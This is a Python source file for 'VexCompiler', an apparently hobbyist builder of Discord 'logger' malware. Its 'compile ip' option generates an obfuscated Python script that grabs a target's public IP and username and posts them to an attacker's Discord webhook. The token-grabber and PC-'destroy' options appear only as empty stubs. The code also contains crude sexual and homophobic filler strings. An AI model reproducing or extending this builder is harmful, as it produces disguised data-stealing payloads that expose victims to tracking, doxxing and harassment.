# Libraries ======================+
import os
import time
import sys
import requests

import random
from colorama import Fore

# OnLaunch ========================+
if sys.platform == "linux" or sys.platform == "linux2":
    osys = "linux"
elif sys.platform == "darwin":
    osys = "osx"
elif sys.platform == "win32":
    osys = "win"

if osys == "win":
    os.system(f"title VexCompiler / Welcome, {os.getlogin()} (Ver. Windows)")

# Variables =======================+
desc = [
    "vex >> vw",
    "hello, "+os.getlogin(),
    "remember that one time "+os.getlogin()+" used VexLog",
    "https://discord.gg/YHynjFuH6v",
    "i hope your having a good day",
    os.getlogin()+"is cute"
]

# Functions =======================+


def error(string):
    print(f"{Fore.RED}[x]: {Fore.LIGHTRED_EX}{string}\n")


def warn(string):
    print(f"{Fore.YELLOW}[/]: {Fore.LIGHTYELLOW_EX}{string}\n")


def info(string):
    print(f"{Fore.BLUE}[i]: {Fore.LIGHTBLUE_EX}{string}\n")


def cls():
    if osys == "linux":
        os.system("clear")
    elif osys == "osx":
        os.system("clear")
    elif osys == "win":
        os.system("cls")


def checkconfig():
    if not os.path.exists("Compiled"):
        config = os.mkdir("Compiled")


def banner():
    print(Fore.LIGHTBLACK_EX+f"""                            
█░█ █▀▀ ▀▄▀ ░░▄▀ █▀▀ █▀█ █▀▄▀█ █▀█ █ █░░ █▀▀ █▀█
▀▄▀ ██▄ █░█ ▄▀░░ █▄▄ █▄█ █░▀░█ █▀▀ █ █▄▄ ██▄ █▀▄
3 Types of compiles / 2 Loggers / {random.choices(desc)}
    """)


# Vex Logger ======================+
cls()
banner()
warn("This can get you banned from discord\nStay safe")
info("Type compilers for all compiled scripts")


def vexcm():

    # Command Input
    cmd = input(Fore.YELLOW+f"Compile %\n{Fore.LIGHTBLACK_EX}")

    # Obfuscation Vars
    randomstrings = ["dex.lol#1337", "project vex", "woow such a good obfuscator",
                     "femor when he sees unsucked dick", "hello all", "vex >> vw", "@everyone",
                     "i admit this is not a good compiler", "bruhhhh", "the creator of this is cute",
                     "honestlyyyyy", "music is very good for you", "i dont like emos", "hendricko",
                     "https://www.youtube.com/channel/UCaEg8bVgAJbVqglXbwulyWw", "buu lol",
                     "gthdusibhtn7854y67b8rsbhtjk", "one two three four five six seven eight",
                     "insert extreeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeemely long text here",
                     "h... h... h... h... h... h... h...", "where my boi hendricko", "stop hacking hacker!!",
                     "why you gotta be muted", "the hdmi port that does hdmi when hdmi like hdmi so hdmi port hdmi's the speaker hdmi",
                     "brah", "i wonder why your using this unless i sent you it", "maybe i just released it on github",
                     "i triedd my very hardest on this i think", "hello there pentagonium", "pls stop using ur soundboard",
                     "im inside your walls.", "pass", "vex", "              "]
    randombools = ["vex = True", "gay = False", "femorgay = True",
                   "funstuff = True", "compiler = True"]
    russo = ["здравствуйте", "Украина", "остановить третью мировую войну",
             "я думаю, что у меня есть чувства к человеку, использующему этот сценарий прямо сейчас",
             "в моем классе есть русская девочка", "мне нравится русский язык, это интересно",
             "хорошо, grammarly, мне не нужна твоя помощь", "упс, немного английского проскользнуло"]

    # Return Command
    if cmd.lower() == "compile ip":
        try:
            checkconfig()
            print("Methods: Bools / Strings / Russian")
            obf = input(
                Fore.YELLOW+f"Obfuscation Method: {Fore.LIGHTBLACK_EX}")
            filename = input(Fore.YELLOW+f"File Name: {Fore.LIGHTBLACK_EX}")
            webhook = input(Fore.YELLOW+f"Webhook: {Fore.LIGHTBLUE_EX}")
            if obf.lower() == "strings":
                obftype = random.choices(randomstrings)
            elif obf.lower() == "russian":
                obftype = random.choices(russo)
            elif obf.lower() == "bools":
                obftype = random.choices(randombools)
            print(Fore.WHITE+"[0]: Semi-Securing webhook link")
            sechook = webhook.split("/")
            print("[0a]: Splitting Webhook")
            print("[0b]: Finished Webhook Splitting // basically made secure a lil")
            newlog = open(f"Compiled/{filename}"+".py", "w+")
            print("[1]: Getting random strings/booleans")
            print("[2]: Writing File")
            newlog.write(f"""
#  ================================
# |         Dex's Compiler         |
#  ================================
#  Please do not mess with the code
#  Reach me on discord dex.lol#1337

'''dex.lol#1377'''
'''''';{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(randombools)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};''''''
'''{random.choices(obftype)}''';import os;import requests;'''{random.choices(obftype)}''';import dhooks;{random.choices(obftype)}
'''{random.choices(obftype)}''';dexIlIlIlIlllIllIIIIllIlIlI="ht";{random.choices(russo)}
'''{random.choices(obftype)}''';dexIlIlIlIllllllIIIIllIlIlI="ipify";l2="{sechook[2]+"/"}";{random.choices(obftype)};''''{random.choices(obftype)}'''
'''{random.choices(obftype)}''';k="";dexIlIlIlIlIIlllIIIIllIlIlI=requests.get;'''{random.choices(obftype)}''';l6="{sechook[6]}";{random.choices(obftype)}
'''{random.choices(obftype)}''';{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};'''dexIIIlIlIlllIllIIIIllIlIII'''
'''{random.choices(obftype)} ''';dexIlIlIlIlllIllIIIIllIlIll="api.";user=os.getlogin();{random.choices(obftype)};l3="{sechook[3]+"/"}";dexIlIlIlIllllllIIIIllIIllIlI=dhooks.Webhook;'''{random.choices(russo)}'''
'''{random.choices(obftype)}''';dexIlIlIlIlllIllIIIIIIIIII=requests;'''voidwatch is gay'''
'''{random.choices(obftype)}''';l0="{sechook[0]+"//"}";{random.choices(obftype)};{random.choices(obftype)};l4="{sechook[4]+"/"}";'''{random.choices(obftype)}''';'''dexIIIlIlIlllIllIIIIllIlIII''';'''{random.choices(obftype)}''';{random.choices(obftype)};{random.choices(obftype)}
'''{random.choices(obftype)}''';{random.choices(obftype)};'''{random.choices(obftype)}''';dexIlIlIlIlllIllIIIIlIIIIII="org";'''{random.choices(obftype)}''';'''femor when unsucked cock is in there area'''
'''{random.choices(obftype)} {random.choices(obftype)}''';'''dexIIIlIlI''';l5="{sechook[5]+"/"}";dexIlIlIlIlllIllIlIIllIlIll=dexIlIlIlIllllllIIIIllIIllIlI(l0+l2+l3+l4+l5+l6);'''lllIllIIIIllIlIII''';'''er''';''''''
'''{random.choices(obftype)} ''';dex_gay=False;'''{random.choices(obftype)}''';{random.choices(obftype)};dexIlIlIlIlllIllIIIIllIlIII="tps";'''dex was here'''
'''{random.choices(obftype)} {random.choices(obftype)}''';{random.choices(obftype)};{random.choices(obftype)};'''{random.choices(obftype)}'''
'''{random.choices(obftype)}''';dexIIIlIlIlllIllIIIIllIlIII=dexIlIlIlIlIIlllIIIIllIlIlI(dexIlIlIlIlllIllIIIIllIlIlI+dexIlIlIlIlllIllIIIIllIlIII+'://'+dexIlIlIlIlllIllIIIIllIlIll+dexIlIlIlIllllllIIIIllIlIlI+'.'+dexIlIlIlIlllIllIIIIlIIIIII).text;'''{random.choices(obftype)}'''
'''{random.choices(obftype)} ''';{random.choices(obftype)};dexIlIlIlIlllIllIlIIllIlIll.send(user+": "+dexIIIlIlIlllIllIIIIllIlIII);'''{random.choices(obftype)}''';pass;{random.choices(obftype)}
'''''';{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};{random.choices(obftype)};''''''
'''dex.lol#1337'''
            """)
            print("[/]: File Compiled, sent to Compiled Folder")
            newlog.close()
        except:
            error(
                "error with compiler // go to github to post an issue (provide details!)")
    elif cmd.lower() == "compile token":
        checkconfig()
        filename = input(Fore.YELLOW+f"File Name: {Fore.LIGHTBLACK_EX}")
        webhook = input(Fore.YELLOW+f"Webhook: {Fore.LIGHTBLUE_EX}")
        print(Fore.WHITE+"[0]: Semi-Securing webhook link")
        sechook = webhook.split("/")
        print("[0a]: Splitting Webhook")
        print("[0b]: Finished Webhook Splitting // basically made secure a lil")
        newlog = open(f"Compiled/{filename}"+".py", "w+")
        print("[1]: Getting random strings/booleans")
        print("[2]: Writing File")
        newlog.write(f"""
        
        """)
        print("[/]: File Compiled, sent to Compiled Folder")
        newlog.close()
    elif cmd.lower() == "compile fucker":
        checkconfig()
        filename = input(Fore.YELLOW+f"File Name: {Fore.LIGHTBLACK_EX}")
        webhook = input(Fore.YELLOW+f"Webhook: {Fore.LIGHTBLUE_EX}")
        print(Fore.WHITE+"[0]: Semi-Securing webhook link")
        sechook = webhook.split("/")
        print("[0a]: Splitting Webhook")
        print("[0b]: Finished Webhook Splitting // basically made secure a lil")
        newlog = open(f"Compiled/{filename}"+".py", "w+")
        print("[1]: Getting random strings/booleans")
        print("[2]: Writing File")
        newlog.write(f"""
#  ================================
# |         Dex's Compiler         |
#  ================================
#  Please do not mess with the code
#  Reach me on discord dex.lol#1337

'''dex.lol#1377'''

        """)
    elif cmd.lower() == "compile all":
        pass
    elif cmd.lower() == "compilers":
        print(f"""
=======================================
Vex Compiler Commands | {random.choices(desc)}
---------------------------------------
[0]: compile ip - compiles a script to
                  grab a targets ip

[1]: compile token - compiles a script
                     to grab a targets
                     token

[2]: compile fucker - compiles a script
                      to "destroy" a
                      targets pc, not
                      fatal

[/]: compile all - compiles all scripts
=======================================
        """)
    elif cmd.lower() == "cls" or cmd.lower() == "clear":
        cls()
        banner()
    else:
        error("Unknown command, try again.")

    # Loop Compiler
    vexcm()


vexcm()
